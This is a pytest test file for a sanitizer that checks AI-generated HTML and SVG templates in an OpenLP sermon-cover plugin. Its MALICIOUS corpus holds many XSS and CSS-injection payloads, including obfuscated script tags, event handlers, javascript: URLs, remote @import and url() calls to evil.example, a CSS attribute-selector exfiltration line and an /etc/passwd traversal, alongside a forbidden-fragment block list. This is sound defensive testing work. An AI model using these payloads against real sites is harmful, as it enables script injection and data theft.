# -*- coding: utf-8 -*-

##########################################################################
# Portadas - sermon cover plugin for OpenLP                              #
# ---------------------------------------------------------------------- #
# Copyright (c) 2026 Portadas contributors                               #
# ---------------------------------------------------------------------- #
# This program is free software: you can redistribute it and/or modify   #
# it under the terms of the GNU General Public License as published by   #
# the Free Software Foundation, either version 3 of the License, or      #
# (at your option) any later version.                                    #
#                                                                        #
# This program is distributed in the hope that it will be useful,        #
# but WITHOUT ANY WARRANTY; without even the implied warranty of         #
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the          #
# GNU General Public License for more details.                           #
#                                                                        #
# You should have received a copy of the GNU General Public License      #
# along with this program.  If not, see <https://www.gnu.org/licenses/>. #
##########################################################################
"""Sanitizer for untrusted (AI-produced) templates: malicious corpus, text guarantee and the built-in templates."""
import re

import pytest
from contrib.plugins.portadas.application.template_catalog import TemplateCatalog
from contrib.plugins.portadas.domain.errors import DomainError
from contrib.plugins.portadas.domain.templating import find_placeholders
from contrib.plugins.portadas.security.html_policy import (
    MAX_BYTES,
    MAX_DEPTH,
    TemplateRejected,
    require_safe_template,
    sanitize_svg,
    sanitize_template,
)

OK = '<div>{{title_main}}</div>'
FORBIDDEN_IN_OUTPUT = (
    '<script', 'onerror', 'onload', 'onclick', 'onmouseover', 'javascript:', '@import', 'http:', 'https:',
    '<iframe', '<object', '<embed', '<link', '<base', '<form', '<input', 'foreignobject', 'expression(',
    'behavior', '-moz-binding', 'http-equiv', 'alert(')


def page(body=OK, head='', body_attrs=''):
    return (f'<!DOCTYPE html><html lang="es"><head><meta charset="utf-8">{head}</head>'
            f'<body{body_attrs}>{body}</body></html>')


def style(css):
    return f'<style>{css}</style>'


# (id, document, violation code that must be reported)
MALICIOUS = [
    ('script-tag', page('<script>alert(1)</script>' + OK), 'element-removed'),
    ('script-src', page('<script src="https://evil.example/x.js"></script>' + OK), 'element-removed'),
    ('script-uppercase', page('<SCRIPT>alert(1)</SCRIPT>' + OK), 'element-removed'),
    ('script-mixedcase', page('<ScRiPt>alert(1)</sCrIpT>' + OK), 'element-removed'),
    ('script-nested-obfuscated', page('<scr<script>ipt>alert(1)</script>' + OK), None),
    ('script-entity-encoded-body', page('&lt;script&gt;alert(1)&lt;/script&gt;' + OK), 'hardcoded-text'),
    ('svg-script', page('<svg viewBox="0 0 1 1"><script>alert(1)</script></svg>' + OK), 'element-removed'),
    ('svg-onload', page('<svg onload="alert(1)" viewBox="0 0 1 1"></svg>' + OK), 'attribute-removed'),
    ('onclick', page('<div onclick="alert(1)">{{title_main}}</div>'), 'attribute-removed'),
    ('onerror-unquoted', page('<div onmouseover=alert(1)>{{title_main}}</div>'), 'attribute-removed'),
    ('onload-uppercase', page('<div ONLOAD="alert(1)">{{title_main}}</div>'), 'attribute-removed'),
    ('javascript-href', page('<a href="javascript:alert(1)"></a>' + OK), 'element-removed'),
    ('javascript-href-entity', page('<a href="jav&#x61;script:alert(1)"></a>' + OK), 'element-removed'),
    ('use-remote', page('<svg><use href="http://evil.example/x.svg#a"></use></svg>' + OK), 'attribute-removed'),
    ('use-xlink-remote', page('<svg><use xlink:href="https://evil.example/x.svg#a"></use></svg>' + OK),
     'attribute-removed'),
    ('use-data-uri', page('<svg><use href="data:image/svg+xml;base64,PHN2Zy8+"></use></svg>' + OK),
     'attribute-removed'),
    ('use-entity-encoded', page('<svg><use href="&#104;ttp://evil.example/x"></use></svg>' + OK),
     'attribute-removed'),
    ('css-import', page(OK, style('@import url(http://evil.example/x.css); div{color:red}')), 'css-rejected'),
    ('css-import-string', page(OK, style('@import "http://evil.example/x.css";')), 'css-rejected'),
    ('css-import-escaped', page(OK, style('@\\69mport "x.css";')), 'css-rejected'),
    ('css-url-remote', page(OK, style('body{background:url(http://evil.example/x.png)}')), 'css-rejected'),
    ('css-url-quoted', page(OK, style('body{background:url("https://evil.example/x.png")}')), 'css-rejected'),
    ('css-url-protocol-relative', page(OK, style('body{background:url(//evil.example/x.png)}')), 'css-rejected'),
    ('css-url-data', page(OK, style('body{background:url(data:image/png;base64,AAAA)}')), 'css-rejected'),
    ('css-url-escaped', page(OK, style('body{background:\\75rl(http://evil.example/x)}')), 'css-rejected'),
    ('css-url-comment', page(OK, style('body{background:url(/**/http://evil.example/x)}')), 'css-rejected'),
    ('css-url-relative-outside-assets', page(OK, style('body{background:url(../../../etc/passwd)}')),
     'css-rejected'),
    ('css-image-set', page(OK, style('body{background:image-set("http://evil.example/x.png" 1x)}')),
     'css-rejected'),
    ('css-exfil-attr-selector', page(OK, style('div[class^=a]{background:url(https://evil.example/?a)}')),
     'css-rejected'),
    ('css-expression', page(OK, style('div{width:expression(alert(1))}')), 'css-rejected'),
    ('css-expression-escaped', page(OK, style('div{width:ex\\70ression(alert(1))}')), 'css-rejected'),
    ('css-javascript', page(OK, style('div{background:javascript:alert(1)}')), 'css-rejected'),
    ('css-behavior', page(OK, style('div{behavior:url(x.htc)}')), 'css-rejected'),
    ('css-moz-binding', page(OK, style('div{-moz-binding:url(x.xml#a)}')), 'css-rejected'),
    ('css-charset-style-break', page(OK, style('div{color:red}</style><script>alert(1)</script>')),
     'element-removed'),
    ('css-placeholder', page(OK, style('div{color:{{title_main}}}')), 'css-rejected'),
    ('style-attr-url', page('<div style="background-image:url(https://evil.example/t.png?d=1)">{{title_main}}</div>'),
     'css-rejected'),
    ('style-attr-entity-url',
     page('<div style="background:u&#114;l(http://evil.example/x)">{{title_main}}</div>'), 'css-rejected'),
    ('style-attr-expression', page('<div style="width:expression(alert(1))">{{title_main}}</div>'),
     'css-rejected'),
    ('meta-refresh', page(OK, '<meta http-equiv="refresh" content="0;url=http://evil.example">'),
     'element-removed'),
    ('meta-in-body', page('<meta http-equiv="refresh" content="0;url=http://evil.example">' + OK),
     'element-removed'),
    ('base', page(OK, '<base href="http://evil.example/">'), 'element-removed'),
    ('link-stylesheet', page(OK, '<link rel="stylesheet" href="http://evil.example/x.css">'), 'element-removed'),
    ('link-preload', page(OK, '<link rel="preload" href="https://evil.example/x" as="image">'),
     'element-removed'),
    ('iframe', page('<iframe src="http://evil.example/"></iframe>' + OK), 'element-removed'),
    ('iframe-srcdoc', page('<iframe srcdoc="<script>alert(1)</script>"></iframe>' + OK), 'element-removed'),
    ('object', page('<object data="http://evil.example/x.swf"></object>' + OK), 'element-removed'),
    ('embed', page('<embed src="http://evil.example/x.swf">' + OK), 'element-removed'),
    ('form', page('<form action="http://evil.example/"><input name="a"></form>' + OK), 'element-removed'),
    ('input-alone', page('<input type="text" value="x">' + OK), 'element-removed'),
    ('img-remote', page('<img src="http://evil.example/t.png">' + OK), 'element-removed'),
    ('img-data-uri', page('<img src="data:image/png;base64,AAAA">' + OK), 'element-removed'),
    ('img-onerror', page('<img src="x" onerror="alert(1)">' + OK), 'element-removed'),
    ('foreign-object', page('<svg><foreignObject><div>hi</div></foreignObject></svg>' + OK), 'element-removed'),
    ('foreign-object-script',
     page('<svg><foreignObject><body onload="alert(1)"></body></foreignObject></svg>' + OK), 'element-removed'),
    ('svg-image-remote', page('<svg><image href="http://evil.example/x.png"></image></svg>' + OK),
     'element-removed'),
    ('svg-animate-href', page('<svg><a><animate attributeName="href" values="javascript:alert(1)"/></a></svg>' + OK),
     'element-removed'),
    ('svg-set', page('<svg><set attributeName="onmouseover" to="alert(1)"></set></svg>' + OK), 'element-removed'),
    ('math', page('<math><mi xlink:href="javascript:alert(1)">x</mi></math>' + OK), 'element-removed'),
    ('noscript', page('<noscript><p title="</noscript><script>alert(1)</script>"></noscript>' + OK),
     'element-removed'),
    ('template', page('<template><script>alert(1)</script></template>' + OK), 'element-removed'),
    ('textarea', page('<textarea><script>alert(1)</script></textarea>' + OK), 'element-removed'),
    ('title-text', page(OK, '<title>Visit evil.example</title>'), 'element-removed'),
    ('xmp', page('<xmp><script>alert(1)</script></xmp>' + OK), 'element-removed'),
    ('comment-script', page('<!--<script>alert(1)</script>-->' + OK), 'comment-removed'),
    ('conditional-comment', page('<!--[if IE]><script>alert(1)</script><![endif]-->' + OK), 'comment-removed'),
    ('cdata', page('<![CDATA[<script>alert(1)</script>]]>' + OK), None),
    ('attribute-breakout-id', page('<div id=\'x" onmouseover="alert(1)\'>{{title_main}}</div>'),
     'attribute-removed'),
    ('attribute-breakout-class', page('<div class=\'a" onclick="alert(1)\'>{{title_main}}</div>'),
     'attribute-removed'),
    ('attribute-unknown', page('<div data-x="1" formaction="http://evil.example/">{{title_main}}</div>'),
     'attribute-removed'),
    ('attribute-placeholder', page('<div title="{{title_main}}">{{title_main}}</div>'), 'attribute-removed'),
    ('attribute-placeholder-in-style', page('<div style="color:{{title_main}}">{{title_main}}</div>'),
     'css-rejected'),
    ('srcdoc-attr', page('<div srcdoc="<script>alert(1)</script>">{{title_main}}</div>'), 'attribute-removed'),
]


@pytest.mark.parametrize('document, code', [pytest.param(d, c, id=i) for i, d, c in MALICIOUS])
def test_malicious_payloads_are_neutralised(document, code):
    result = sanitize_template(document)

    if code is not None:
        assert code in {violation.code for violation in result.violations}
    if result.accepted:
        lowered = result.html.lower()
        for fragment in FORBIDDEN_IN_OUTPUT:
            assert fragment not in lowered, fragment
        assert not re.search(r'\son[a-z]+\s*=', lowered)
        assert find_placeholders(result.html) == ('title_main',)
    else:
        assert result.html is None


@pytest.mark.parametrize('document', [d for _, d, c in MALICIOUS if c in ('element-removed', 'attribute-removed')])
def test_removable_payloads_still_yield_a_usable_template(document):
    result = sanitize_template(document)

    assert result.accepted
    assert result.violations
    assert all(not violation.fatal for violation in result.violations)


@pytest.mark.parametrize('body', [
    '<p>Hello</p>' + OK,
    OK + 'trailing words',
    '<div>{{title_main}} and more</div>',
    '<div>{{title_main}}{{subtitle}}</div>',
    '<div>{{nope}}</div>',
    '<div>{{title_main}</div>' + OK,
    '<div>&#123;&#123;title_main&#125;&#125; </div>{{title_main}}x',
    '<ul><li>{{readings}}</li><li>Static</li></ul>' + OK,
    '<span>1</span>' + OK,
    '<div>&nbsp;x</div>' + OK,
    '<div>{{empty_fields}}</div>' + OK,
])
def test_hardcoded_visible_text_is_rejected(body):
    result = sanitize_template(page(body))

    assert not result.accepted
    assert 'hardcoded-text' in {violation.code for violation in result.violations}
    assert any(violation.fatal for violation in result.violations)


def test_text_in_head_outside_style_is_rejected():
    result = sanitize_template(page(OK, 'Some text'))

    assert 'hardcoded-text' in {violation.code for violation in result.violations}


@pytest.mark.parametrize('content', [
    '"Visit evil.example"', "'x'", '"\\0041"', 'attr(class)', 'counter(a)', 'url(#a)', '"a" "b"', 'open-quote',
    '" "',
])
def test_css_content_with_visible_text_is_rejected(content):
    result = sanitize_template(page(OK, style('div::after{content:' + content + '}')))

    assert not result.accepted
    assert 'css-content-text' in {violation.code for violation in result.violations}


@pytest.mark.parametrize('content', ['""', "''", 'none', 'normal', '"" '])
def test_css_content_that_shows_nothing_is_allowed(content):
    result = sanitize_template(page(OK, style('div::before{content:' + content + ';display:block}')))

    assert result.accepted
    assert not result.violations


def test_content_in_style_attribute_is_also_checked():
    result = sanitize_template(page('<div style="content:\'x\'">{{title_main}}</div>'))

    assert not result.accepted


def test_missing_required_placeholder_is_rejected():
    result = sanitize_template(page('<div>{{subtitle}}</div>'), required=('title_main',))

    assert not result.accepted
    assert 'missing-placeholder' in {violation.code for violation in result.violations}


def test_required_placeholders_are_configurable():
    document = page('<div>{{title_main}}</div><ul>{{readings}}</ul>')

    assert sanitize_template(document, required=('title_main', 'readings')).accepted
    assert not sanitize_template(page(OK), required=('title_main', 'readings')).accepted
    assert sanitize_template(page('<div>{{subtitle}}</div>'), required=()).accepted


def test_unknown_required_placeholder_is_an_error():
    with pytest.raises(DomainError):
        sanitize_template(page(), required=('nope',))


def test_oversized_input_is_rejected_without_parsing():
    result = sanitize_template(page(OK + '<div></div>' * (MAX_BYTES // 11 + 10)))

    assert not result.accepted
    assert result.violations[0].code == 'too-large'


def test_multibyte_text_counts_as_bytes():
    result = sanitize_template(page(OK, style('/*' + 'ñ' * (MAX_BYTES // 2 + 1) + '*/')))

    assert result.violations[0].code == 'too-large'


def test_excessive_nesting_is_rejected():
    result = sanitize_template(page('<div>' * (MAX_DEPTH + 5) + '{{title_main}}' + '</div>' * (MAX_DEPTH + 5)))

    assert not result.accepted
    assert 'too-deep' in {violation.code for violation in result.violations}


def test_nesting_at_the_limit_is_accepted():
    depth = MAX_DEPTH - 2
    result = sanitize_template(page('<div>' * depth + '{{title_main}}' + '</div>' * depth))

    assert result.accepted


def test_too_many_elements_are_rejected():
    result = sanitize_template(page(OK + '<span></span>' * 6000))

    assert 'too-many-elements' in {violation.code for violation in result.violations}


def test_control_characters_are_rejected():
    result = sanitize_template(page(OK + '\x00'))

    assert not result.accepted
    assert result.violations[0].code == 'control-characters'


def test_non_string_input_is_rejected():
    with pytest.raises(DomainError):
        sanitize_template(None)


def test_unclosed_dropped_element_swallows_the_rest_and_fails_closed():
    result = sanitize_template(page('<iframe>' + OK))

    assert not result.accepted
    assert 'missing-placeholder' in {violation.code for violation in result.violations}


# Things that must survive untouched.

def test_allowed_css_and_svg_features_pass():
    css = ('@font-face{font-family:"Outfit";src:url(../../assets/fonts/Outfit-Variable.ttf) format("truetype")}'
           'body{background:radial-gradient(circle at 10% 10%,#fff,#000)}'
           '.a::before{content:"";display:block}.b{fill:url(#g);background:url("../../assets/backgrounds/bg.png")}'
           '@media (min-width:100px){.c{color:red}}')
    svg = ('<svg viewBox="0 0 10 10"><defs><linearGradient id="g"><stop offset="0" stop-color="#fff"/></linearGradient>'
           '<path id="p" d="M0 0L5 5"/></defs><use href="#p"/><circle cx="1" cy="1" r="1" fill="url(#g)"/></svg>')
    body = svg + '<img src="../../assets/backgrounds/bg.png"><div class="a b">{{title_main}}</div>'

    result = sanitize_template(page(body, style(css)))

    assert result.accepted
    assert not result.violations
    assert 'url(../../assets/fonts/Outfit-Variable.ttf)' in result.html
    assert '<use href="#p">' in result.html
    assert 'url(#g)' in result.html
    assert '<img src="../../assets/backgrounds/bg.png">' in result.html


def test_body_class_hook_survives_in_any_spelling():
    for spelling in ('{{empty_fields}}', '{{ empty_fields }}', 'a {{empty_fields}} b'):
        result = sanitize_template(page(OK, body_attrs=f' class="{spelling}"'))

        assert result.accepted and not result.violations, spelling
        assert '{{empty_fields}}' in result.html


def test_output_is_a_canonical_document_with_hoisted_styles():
    result = sanitize_template('<style>div{color:red}</style><div id="a" class="b">{{title_main}}</div>')

    assert result.accepted
    assert result.html.startswith('<!DOCTYPE html>')
    assert result.html.index('<style>') < result.html.index('<body')
    assert '<meta charset="utf-8">' in result.html


def test_sanitizing_is_idempotent_on_hostile_input():
    for _, document, _ in MALICIOUS:
        first = sanitize_template(document)
        if first.accepted:
            second = sanitize_template(first.html)

            assert second.html == first.html
            assert not second.violations


def test_require_safe_template_returns_html_or_raises():
    assert '{{title_main}}' in require_safe_template(page('<script>x</script>' + OK))

    with pytest.raises(TemplateRejected) as error:
        require_safe_template(page('<p>Hi</p>' + OK))

    assert error.value.violations
    assert isinstance(error.value, DomainError)
    assert 'hard-coded' in str(error.value).lower()


# The three built-in templates must pass the same policy unchanged.

@pytest.mark.parametrize('template_id', ['noche-dorada', 'luz-clara', 'minimal'])
def test_builtin_templates_pass_the_policy(template_id):
    template = TemplateCatalog().load(template_id)

    result = sanitize_template(template.html, required=template.manifest.required)

    assert result.accepted
    assert result.violations == ()
    assert set(find_placeholders(result.html)) == set(find_placeholders(template.html))
    assert sanitize_template(result.html, required=template.manifest.required).html == result.html


# Inline SVG icons proposed by the AI.

def test_sanitize_svg_keeps_a_clean_icon():
    result = sanitize_svg('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 8 8" fill="none" stroke="currentColor">'
                          '<path d="M1 1L7 7"/></svg>')

    assert result.accepted
    assert result.html.startswith('<svg viewbox="0 0 8 8"')
    assert 'xmlns' not in result.html


@pytest.mark.parametrize('payload', [
    '<svg><script>alert(1)</script><path d="M0 0"/></svg>',
    '<svg onload="alert(1)"><path d="M0 0"/></svg>',
    '<svg><foreignObject><div>x</div></foreignObject></svg>',
    '<svg><use href="http://evil.example/x.svg#a"/></svg>',
    '<svg><style>@import url(http://evil.example/x.css);</style><path d="M0 0"/></svg>',
    '<svg><path style="fill:url(http://evil.example/x)" d="M0 0"/></svg>',
])
def test_sanitize_svg_neutralises_payloads(payload):
    result = sanitize_svg(payload)

    assert result.violations
    if result.accepted:
        lowered = result.html.lower()
        assert not any(fragment in lowered for fragment in FORBIDDEN_IN_OUTPUT)


@pytest.mark.parametrize('payload', [
    '<div>not an svg</div>',
    '<svg><path d="M0 0"/></svg><svg></svg>',
    '<svg>text</svg>',
    '<p>x</p><svg></svg>',
    '',
])
def test_sanitize_svg_requires_exactly_one_text_free_svg_root(payload):
    assert not sanitize_svg(payload).accepted


# --- T12b: pathological nesting never raises ---------------------------------------------------------------------

DEEP = '<div>' * 5000 + OK + '</div>' * 5000


def test_a_template_nested_thousands_of_levels_deep_is_rejected_not_raised():
    result = sanitize_template(page(DEEP))

    assert not result.accepted and 'too-deep' in {violation.code for violation in result.violations}


def test_an_icon_nested_thousands_of_levels_deep_is_rejected_not_raised():
    result = sanitize_svg('<svg>' + '<g>' * 5000 + '</g>' * 5000 + '</svg>')

    assert not result.accepted


def test_require_safe_template_reports_deep_nesting_as_a_rejection():
    with pytest.raises(TemplateRejected):
        require_safe_template(page(DEEP))
